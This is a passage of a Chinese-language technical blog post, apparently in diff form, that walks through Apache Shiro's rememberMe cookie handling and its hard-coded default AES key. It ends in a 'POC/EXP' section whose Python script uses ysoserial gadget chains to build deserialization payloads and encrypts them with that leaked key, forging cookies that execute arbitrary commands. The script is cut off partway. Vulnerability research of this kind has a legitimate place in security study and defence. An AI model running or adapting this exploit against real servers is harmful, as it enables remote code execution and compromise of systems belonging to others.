+<li>这里获取看配置信息，最后addCookieHeader放到了返回包中的cookie头中，其中就有我们熟悉的，deleteMe字段和rememberMe字段，也就是我们指纹识别最简单的两种方法的原理</li>
+</ul>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDMyMjMucG5n?x-oss-process=image/format,png" alt="image-20200902103223302"></p>
+<ul>
+<li>然后这一阶段结束了，随后回到刚刚的onSuccessfulLogin方法中，这个isRememberMe主要是检查选择了remember me这个按钮没有，随后步入 rememberIdentity 方法，看看做了什么</li>
+</ul>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDM1MDEucG5n?x-oss-process=image/format,png" alt="image-20200902103501055"></p>
+<p>在rememberIdentity方法中，authcInfo的值就是我们输入root用户名，继续跟进rememberIdentity函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PrincipalCollection principals &#x3D; this.getIdentityToRemember(subject, authcInfo);</span><br><span class="line">this.rememberIdentity(subject, principals);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDM4MDYucG5n?x-oss-process=image/format,png" alt="image-20200902103806491"></p>
+<p>进入rememberIdentity方法后发现，一个函数就是转化为bytes，跟进convertPrincipalsToBytes</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">rememberIdentity</span><span class="params">(Subject subject, PrincipalCollection accountPrincipals)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.convertPrincipalsToBytes(accountPrincipals);</span><br><span class="line">    <span class="keyword">this</span>.rememberSerializedIdentity(subject, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDQ2MTQucG5n?x-oss-process=image/format,png" alt="image-20200902104614572"></p>
+<ul>
+<li>进入convertPrincipalsToBytes方法，发现它会序列化，而且序列化的是传入的root用户名</li>
+<li>后续跟进看了一下，就是普通的序列化，没有什么特殊的操作，就不继续写了</li>
+<li>然后调用encrypt方法加密序列化后的二进制字节</li>
+<li>这个必须得跟进看一下encrypt方法吧</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] convertPrincipalsToBytes(PrincipalCollection principals) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] bytes = <span class="keyword">this</span>.serialize(principals);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        bytes = <span class="keyword">this</span>.encrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现CipherService cipherService = this.getCipherService()，就是获取密码服务的意思，那么看一下获取了这么，看一结果发现是AES加密方法，而且是AES/CBC/PKCS5Padding</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] serialized) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] value = serialized;</span><br><span class="line">    CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ByteSource byteSource = cipherService.encrypt(serialized, <span class="keyword">this</span>.getEncryptionCipherKey());</span><br><span class="line">        value = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMDU2MzkucG5n?x-oss-process=image/format,png" alt="image-20200902105639625"></p>
+<p>那么下一句话就是：加密这个传入的数据的方法了。</p>
+<p>再看这就话this.getEncryptionCipherKey()，明显这是获取秘钥了，直接跟进getEncryptionCipherKey</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteSource byteSource = cipherService.encrypt(serialized, <span class="keyword">this</span>.getEncryptionCipherKey());</span><br></pre></td></tr></table></figure>
+
+<p>这个找key 就是在这个类中反复横跳，就可以找到，就详细看了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">this.encryptionCipherKey</span><br><span class="line">setEncryptionCipherKey（）</span><br><span class="line">setCipherKey(byte[] cipherKey)---setEncryptionCipherKey（）</span><br><span class="line">this.setCipherKey(DEFAULT_CIPHER_KEY_BYTES)</span><br></pre></td></tr></table></figure>
+
+<p>最终溯源到 getEncryptionCipherKey 就是开头中的 DEFAULT_CIPHER_KEY_BYTES，也就是我们一开始第一个提到的kPH+bIxk5D2deZiIxcaaaA==这个key</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMTA3NDEucG5n?x-oss-process=image/format,png" alt="image-20200902110741059"></p>
+<p>随后就传入 encrypt函数（root ，刚刚获取的key），这时就加密方法了！！！</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteSource <span class="title">encrypt</span><span class="params">(<span class="keyword">byte</span>[] plaintext, <span class="keyword">byte</span>[] key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] ivBytes = <span class="keyword">null</span>;</span><br><span class="line">  </span><br><span class="line">   <span class="comment">//生成初始化向量，随后 generate:TURE</span></span><br><span class="line">    <span class="keyword">boolean</span> generate = <span class="keyword">this</span>.isGenerateInitializationVectors(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (generate) &#123;</span><br><span class="line">      	 </span><br><span class="line">      	<span class="comment">//产生初始化向量</span></span><br><span class="line">        ivBytes = <span class="keyword">this</span>.generateInitializationVector(<span class="keyword">false</span>);</span><br><span class="line">      </span><br><span class="line">      	<span class="comment">//异常，不会进入的</span></span><br><span class="line">        <span class="keyword">if</span> (ivBytes == <span class="keyword">null</span> || ivBytes.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Initialization vector generation is enabled - generated vectorcannot be null or empty."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">//再跟进就是更加具体的方法了，基本的加密逻辑已知 序列化root key 然后还有iv</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.encrypt(plaintext, key, ivBytes, generate);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>加密后数据一直向上回溯，直到 rememberIdentity这个方法下有个 rememberSerializedIdentity方法要跟如，因为这个是记住序列化身份的功能</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMTMyMzIucG5n?x-oss-process=image/format,png" alt="image-20200902113232687"></p>
+<p>跟如这个方法，就基本上到了加密的最后一步，把刚刚加密的数据base64，然后都加入到cookie里面</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxMTM0MjMucG5n?x-oss-process=image/format,png" alt="image-20200902113423550"></p>
+<h2 id="解密过程："><a href="#解密过程：" class="headerlink" title="解密过程："></a>解密过程：</h2><p>现在继续研究解密过程：</p>
+<ul>
+<li>首先确定切入点</li>
+<li>我选择从获取到客户端数据开始分析 ，那就是 org.apache.shiro.mgt.AbstractRememberMeManager 类的 getRememberedPrincipals 方法下断点</li>
+<li>随后在页面随便刷新一下，就可以触发这个方法</li>
+</ul>
+<p>直接跟进 getRememberedSerializedIdentity(subjectContext) 方法，看看从数据中，都获取了什么</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDAxMjAucG5n?x-oss-process=image/format,png" alt="image-20200902140120404"></p>
+<p>这个getRememberedSerializedIdentity方法中 有一个this.getCookie().readValue(request, response)</p>
+<p>这是要读取cookice中的数据了，这必须跟入了</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDA0NDgucG5n?x-oss-process=image/format,png" alt="image-20200902140447964"></p>
+<p>然后 readValue 方法，根据 Cookie 中的 name 字段（这个字段就是 rememberMe）获取 Cookie 的值</p>
+<p>最终把获取cookie里面的rememberme 给到 value 返回上一级函数</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDE4NTIucG5n?x-oss-process=image/format,png" alt="image-20200902141852472"></p>
+<p>回到getRememberedSerializedIdentity方法中，使用base64解密，成为二进制的数据，继续向上传递</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byte[] decoded &#x3D; Base64.decode(base64);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>再次回到AbstractRememberMeManager 类</p>
+</li>
+<li><p>下一个流程就是 convertBytesToPrincipals 方法，这就是对应加密的解析数据，中间肯定要解密数据，继续跟入</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDI3MTcucG5n?x-oss-process=image/format,png" alt="image-20200902142717154"></p>
+</li>
+</ul>
+<p>进入发现了 decrypt（）函数，这就很明显就进行解密了，继续跟入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> PrincipalCollection <span class="title">convertBytesToPrincipals</span><span class="params">(<span class="keyword">byte</span>[] bytes, SubjectContext subjectContext)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.getCipherService() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        bytes = <span class="keyword">this</span>.decrypt(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.deserialize(bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDI5NDUucG5n?x-oss-process=image/format,png" alt="image-20200902142945142"></p>
+<h3 id="详细看看decrypt解密函数："><a href="#详细看看decrypt解密函数：" class="headerlink" title="详细看看decrypt解密函数："></a>详细看看decrypt解密函数：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">    CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">        ByteSource byteSource = cipherService.decrypt(encrypted, <span class="keyword">this</span>.getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>getCipherService();老熟人了，获取加密方法：AES/CBC/PKCS5Padding</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNDM0MTgucG5n?x-oss-process=image/format,png" alt="image-20200902143418030"></p>
+<p>最后到这句话，获取老朋友AES的秘钥 getDecryptionCipherKey()后，带着秘文和AES公钥进入decrypt函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteSource byteSource = cipherService.decrypt(encrypted, <span class="keyword">this</span>.getDecryptionCipherKey());</span><br></pre></td></tr></table></figure>
+
+<p>跟进到了JcaCipherService的decrypt函数里面：分析一下里面的逻辑</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ByteSource <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] ciphertext, <span class="keyword">byte</span>[] key)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] encrypted = ciphertext;</span><br><span class="line">    <span class="keyword">byte</span>[] iv = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isGenerateInitializationVectors(<span class="keyword">false</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> ivSize = <span class="keyword">this</span>.getInitializationVectorSize();</span><br><span class="line">            <span class="keyword">int</span> ivByteSize = ivSize / <span class="number">8</span>;</span><br><span class="line">            iv = <span class="keyword">new</span> <span class="keyword">byte</span>[ivByteSize];</span><br><span class="line">          	</span><br><span class="line">          	<span class="comment">//ivByteSize=16</span></span><br><span class="line">          	<span class="comment">//ciphertext这个数组 0-16位 覆盖到 iv数组 ，相当于给 vi赋值 ciphertext的前16位</span></span><br><span class="line">            System.arraycopy(ciphertext, <span class="number">0</span>, iv, <span class="number">0</span>, ivByteSize);</span><br><span class="line">          </span><br><span class="line">          	<span class="comment">// </span></span><br><span class="line">            <span class="keyword">int</span> encryptedSize = ciphertext.length - ivByteSize;</span><br><span class="line">            encrypted = <span class="keyword">new</span> <span class="keyword">byte</span>[encryptedSize];</span><br><span class="line">          	</span><br><span class="line">           	<span class="comment">// ciphertext数组 ，从 16位后面的数据 赋值给encrypted </span></span><br><span class="line">            System.arraycopy(ciphertext, ivByteSize, encrypted, <span class="number">0</span>, encryptedSize);</span><br><span class="line">          </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">            String msg = <span class="string">"Unable to correctly extract the Initialization Vector or ciphertext."</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> CryptoException(msg, var8);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//进入下一层解密</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.decrypt(encrypted, key, iv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>追随到 JcaCipherService 的 decrypt 方法中，继续跟入 crypt 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ByteSource <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] ciphertext, <span class="keyword">byte</span>[] key, <span class="keyword">byte</span>[] iv)</span> <span class="keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">"Attempting to decrypt incoming byte array of length "</span> + (ciphertext != <span class="keyword">null</span> ? ciphertext.length : <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] decrypted = <span class="keyword">this</span>.crypt(ciphertext, key, iv, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> decrypted == <span class="keyword">null</span> ? <span class="keyword">null</span> : Util.bytes(decrypted);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跑到 JcaCipherService 中的 crypt 方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] crypt(<span class="keyword">byte</span>[] bytes, <span class="keyword">byte</span>[] key, <span class="keyword">byte</span>[] iv, <span class="keyword">int</span> mode) <span class="keyword">throws</span> IllegalArgumentException, CryptoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (key != <span class="keyword">null</span> &amp;&amp; key.length != <span class="number">0</span>) &#123;</span><br><span class="line">      </span><br><span class="line">   			<span class="comment">//初始化cipher，再跟入就是 原生的 cipher.init 解密方法了</span></span><br><span class="line">        Cipher cipher = <span class="keyword">this</span>.initNewCipher(mode, key, iv, <span class="keyword">false</span>);</span><br><span class="line">      	<span class="comment">// 基本完成解密</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.crypt(cipher, bytes);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"key argument cannot be null or empty."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="解密完成，序列化操作"><a href="#解密完成，序列化操作" class="headerlink" title="解密完成，序列化操作"></a>解密完成，序列化操作</h2><p>解密完成后，一步步的return回到上级函数，回到AbstractRememberMeManager 的 decrypt 方法，看一下数据 r00 开头 序列化的数据</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNjE5NDcucG5n?x-oss-process=image/format,png" alt="image-20200902161947628"></p>
+<p>向上return，看到deserialize 反序列化的方法了</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNjI2NDcucG5n?x-oss-process=image/format,png" alt="image-20200902162647497"></p>
+<p>一直跟进到 DefaultSerializer 的 deserialize方法中，见到了久违的 readObject（）方法</p>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA5MDIxNjI4MTkucG5n?x-oss-process=image/format,png" alt="image-20200902162819610"></p>
+<h1 id="0x04-编写POC-EXP"><a href="#0x04-编写POC-EXP" class="headerlink" title="0x04 编写POC EXP"></a>0x04 编写POC EXP</h1><h2 id="本次AES加密的一些小知识点："><a href="#本次AES加密的一些小知识点：" class="headerlink" title="本次AES加密的一些小知识点："></a>本次AES加密的一些小知识点：</h2><ul>
+<li>某些加密算法要求明文需要按一定长度对齐，叫做块大小(BlockSize)，我们这次就是16字节，那么对于一段任意的数据，加密前需要对最后一个块填充到16 字节，解密后需要删除掉填充的数据。</li>
+<li>AES中有三种填充模式(PKCS7Padding/PKCS5Padding/ZeroPadding)</li>
+<li>PKCS7Padding跟PKCS5Padding的区别就在于数据填充方式，PKCS7Padding是缺几个字节就补几个字节的0，而PKCS5Padding是缺几个字节就补充几个字节的几，好比缺6个字节，就补充6个字节的6</li>
+</ul>
+<p>加密流程就是：</p>
+<ul>
+<li><p>使用的 AES/CBC/PKCS5Padding 模式</p>
+</li>
+<li><p>random = this.ensureSecureRandom(); 使用随机数生成 ivBytes</p>
+</li>
+<li><p>key为预留的那个硬编码</p>
+</li>
+<li><p>encrypt(plaintext, key, ivBytes, generate) 生成</p>
+</li>
+<li><p>最后base64加密，放入cookie中</p>
+</li>
+</ul>
+<p>解密流程可以知道：</p>
+<ul>
+<li><p>使用的 AES/CBC/PKCS5Padding 模式 ，所以Key要求是为16位的，key为预留的那个硬编码</p>
+</li>
+<li><p>base64解密cookie 中 rememberMe的值</p>
+</li>
+<li><p>根据解密 vi 是 秘文的前16位</p>
+</li>
+<li><p>iv即为rememberMe解码后的前16个字节</p>
+</li>
+<li><p>有了key 和 vi 就可以解密到反序列化的数据了</p>
+</li>
+</ul>
+<p>那POC的我们的加密流程就是：</p>
+<ol>
+<li>获取到 反序列化的数据</li>
+<li>设置AES加密模式，使用AES.MODE_CBC的分块模式</li>
+<li>设置硬编码的 key</li>
+<li>使用随机数生成 16 字节的 iv</li>
+<li>使用 iv + AES加密(反序列化数据) 拼接</li>
+<li>最后base64加密全部内容</li>
+</ol>
+<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>这里主要导入的是这个版本的apache.commons</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;groupId&gt;org.apache.commons&lt;&#x2F;groupId&gt;</span><br><span class="line">&lt;artifactId&gt;commons-collections4&lt;&#x2F;artifactId&gt;</span><br><span class="line">&lt;version&gt;4.0&lt;&#x2F;version&gt;</span><br></pre></td></tr></table></figure>
+
+<p>所以我们EXP利用CommonsCollections2 的利用链</p>
+<p>主要依靠ysoserial生成利用的反序列化数据，然后根据加密的思路，把利用链加进去。</p>
+<h2 id="Python代码"><a href="#Python代码" class="headerlink" title="Python代码"></a>Python代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">    <span class="comment"># 这里使用CommonsCollections2模块</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial.jar'</span>, <span class="string">'CommonsCollections2'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 明文需要按一定长度对齐，叫做块大小BlockSize 这个块大小是 block_size = 16 字节</span></span><br><span class="line">    BS = AES.block_size</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 按照加密规则按一定长度对齐,如果不够要要做填充对齐</span></span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 泄露的key</span></span><br><span class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># AES的CBC加密模式</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用uuid4基于随机数模块生成16字节的 iv向量</span></span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 实例化一个加密方式为上述的对象</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 用pad函数去处理yso的命令输出，生成的序列化数据</span></span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># iv 与 （序列化的AES加密后的数据）拼接， 最终输出生成rememberMe参数</span></span><br><span class="line">    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64_rememberMe_value</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dnslog</span><span class="params">(command)</span>:</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, <span class="string">'ysoserial.jar'</span>, <span class="string">'URLDNS'</span>, command], stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_rememberMe_value = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span 